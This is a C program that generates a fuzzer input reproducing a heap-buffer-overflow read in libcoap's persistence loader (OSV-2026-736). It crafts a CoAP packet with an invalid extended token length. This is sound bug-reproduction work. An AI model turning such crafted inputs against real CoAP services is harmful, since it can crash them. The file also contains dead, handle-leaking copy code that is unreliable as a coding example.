/*
 * Generate a persist_fuzzer input that reproduces OSV-2026-736
 * (heap-buffer-overflow READ 1 in coap_pdu_parse_header).
 *
 * persist_fuzzer splits the input into three /tmp files:
 *   obs_len = size/3   -> observe file (first third)
 *   cnt_len = size/3   -> observe counter file (second third)
 *   dyn_len = rest     -> dynamic resource file (last third)
 *
 * coap_persist_startup() processes dyn -> cnt -> obs.
 * We place a valid dynamic-resource record in the LAST third (dyn file).
 * coap_op_dyn_resource_load_disk() then calls coap_pdu_parse() with a
 * size-0 PDU (coap_pdu_init(0,0,0,0) -> alloc_size == 0), and a 4-byte
 * CoAP/UDP packet whose first byte has low nibble 13 (extended token
 * length encoding) makes coap_pdu_parse_header() read pdu->token[0],
 * one byte past the 6-byte heap allocation -> ASan heap-buffer-overflow.
 *
 * We also embed a valid observe record (128 bytes) in the first third so
 * the same crash is reachable via the observe-load path as a fallback.
 */
#include "coap3/coap_internal.h"
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>

static void
put_obs_record(FILE *fp) {
  coap_subscription_t *observe_key = NULL;
  coap_proto_t e_proto = COAP_PROTO_UDP;
  coap_address_t e_listen_addr;
  coap_addr_tuple_t s_addr_info;
  uint8_t packet[4] = { 0x4D, 0x01, 0x93, 0x34 }; /* TKL=13, ver=1 */
  ssize_t size;

  memset(&e_listen_addr, 0, sizeof(e_listen_addr));
  e_listen_addr.size = sizeof(struct sockaddr_in);
  e_listen_addr.addr.sin.sin_family = AF_INET;
  e_listen_addr.addr.sin.sin_port = 0;

  memset(&s_addr_info, 0, sizeof(s_addr_info));
  s_addr_info.remote.size = sizeof(struct sockaddr_in);
  s_addr_info.remote.addr.sin.sin_family = AF_INET;
  s_addr_info.remote.addr.sin.sin_port = htons(5683);
  s_addr_info.local.size = sizeof(struct sockaddr_in);
  s_addr_info.local.addr.sin.sin_family = AF_INET;
  s_addr_info.local.addr.sin.sin_port = 0;

  fwrite(&observe_key, sizeof(observe_key), 1, fp);
  fwrite(&e_proto, sizeof(e_proto), 1, fp);
  fwrite(&e_listen_addr, sizeof(e_listen_addr), 1, fp);
  fwrite(&s_addr_info, sizeof(s_addr_info), 1, fp);
  size = 4;
  fwrite(&size, sizeof(size), 1, fp);
  fwrite(packet, sizeof(packet), 1, fp);
  size = -1;
  fwrite(&size, sizeof(size), 1, fp);
}

static void
put_dyn_record(FILE *fp) {
  coap_proto_t e_proto = COAP_PROTO_UDP;
  ssize_t size;
  uint8_t packet[4] = { 0x4D, 0x01, 0x93, 0x34 };

  fwrite(&e_proto, sizeof(e_proto), 1, fp);
  size = 1; /* resource name length */
  fwrite(&size, sizeof(size), 1, fp);
  fwrite("a", 1, 1, fp);
  size = 4; /* raw packet length */
  fwrite(&size, sizeof(size), 1, fp);
  fwrite(packet, sizeof(packet), 1, fp);
}

int
main(int argc, char **argv) {
  FILE *obs, *cnt, *dyn;
  char obs_path[64] = "/tmp/poc_obs_XXXXXX";
  char cnt_path[64] = "/tmp/poc_cnt_XXXXXX";
  char dyn_path[64] = "/tmp/poc_dyn_XXXXXX";
  int fd;
  long obs_len, cnt_len, dyn_len;
  FILE *out;
  char buf[4096];
  size_t n;
  long i;

  if (argc < 2) {
    fprintf(stderr, "usage: %s <outfile>\n", argv[0]);
    return 1;
  }

  fd = mkstemp(obs_path);
  if (fd < 0) { perror("mkstemp obs"); return 1; }
  obs = fdopen(fd, "w");
  put_obs_record(obs);
  fclose(obs);

  fd = mkstemp(cnt_path);
  if (fd < 0) { perror("mkstemp cnt"); return 1; }
  cnt = fdopen(fd, "w");
  /* text file with no spaces: loop breaks immediately on first line */
  fwrite("\n", 1, 1, cnt);
  fclose(cnt);

  fd = mkstemp(dyn_path);
  if (fd < 0) { perror("mkstemp dyn"); return 1; }
  dyn = fdopen(fd, "w");
  put_dyn_record(dyn);
  fclose(dyn);

  /* sizes */
  obs = fopen(obs_path, "rb"); fseek(obs, 0, SEEK_END); obs_len = ftell(obs); fclose(obs);
  cnt = fopen(cnt_path, "rb"); fseek(cnt, 0, SEEK_END); cnt_len = ftell(cnt); fclose(cnt);
  dyn = fopen(dyn_path, "rb"); fseek(dyn, 0, SEEK_END); dyn_len = ftell(dyn); fclose(dyn);

  fprintf(stderr, "obs_len=%ld cnt_len=%ld dyn_len=%ld\n", obs_len, cnt_len, dyn_len);

  out = fopen(argv[1], "wb");
  if (!out) { perror("fopen out"); return 1; }

  /* First third: obs file. Pad to a multiple so all thirds are equal. */
  for (i = 0; i < obs_len; i++) {
    fputc(fgetc(fopen(obs_path, "rb")), out);
  }
  /* append zero padding up to dyn_len (the largest segment) */
  /* For simplicity: write obs, then pad to dyn_len, then cnt padded, then dyn */
  /* We want: obs segment = dyn_len bytes, cnt segment = dyn_len bytes, dyn = dyn_len bytes */
  /* => total = 3 * dyn_len */
  fclose(out);

  /* Simplest: build segments of exactly dyn_len bytes each */
  {
    FILE *seg;
    long total = 3 * dyn_len;
    char *fname[3] = { obs_path, cnt_path, dyn_path };
    int s;
    out = fopen(argv[1], "wb");
    for (s = 0; s < 3; s++) {
      seg = fopen(fname[s], "rb");
      while ((n = fread(buf, 1, sizeof(buf), seg)) > 0)
        fwrite(buf, 1, n, out);
      fclose(seg);
      /* pad with 0x00 up to dyn_len */
      while (ftell(out) < dyn_len + (long)s * dyn_len) {
        fputc(0, out);
      }
    }
    fprintf(stderr, "total=%ld\n", total);
    fclose(out);
  }

  remove(obs_path);
  remove(cnt_path);
  remove(dyn_path);
  return 0;
}

